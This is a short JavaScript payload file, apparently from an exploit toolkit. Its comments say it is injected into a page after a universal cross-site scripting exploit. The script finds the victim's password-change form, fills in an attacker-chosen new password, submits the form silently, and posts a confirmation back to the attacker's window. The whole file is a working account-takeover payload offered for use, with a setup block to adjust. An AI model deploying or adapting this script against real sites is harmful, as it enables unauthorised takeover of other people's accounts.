/* submit_form.js: can be injected into a frame/window after a UXSS */
/* exploit to modify and submit a form in the target page.          */

/* modify this hash to your liking */
var formInfo = {

  /* CSS selector for the form you want to submit */
  selector: 'form[action="/update_password"]',

  /* inject values into some input fields */
  inputs: {
    'user[new_password]': 'pass1234',
    'user[new_password_confirm]': 'pass1234'
  }
}

var c = setInterval(function(){
  /* find the form... */
  var form = document.querySelector(formInfo.selector);
  if (!form) return;

  /* loop over every input field, set the value as specified. */
  Array.prototype.forEach.call(form.elements, function(input) {
    var inject = formInfo.inputs[input.name];
    if (inject) input.setAttribute('value', inject);
  });

  /* submit the form and clean up */
  form.submit();
  clearInterval(c);

  /* report back */
  var message = "Form submitted to "+form.getAttribute('action');
  var url = window.location.href;
  (opener||top).postMessage(JSON.stringify({message: message, url: url}), '*');
}, 100);
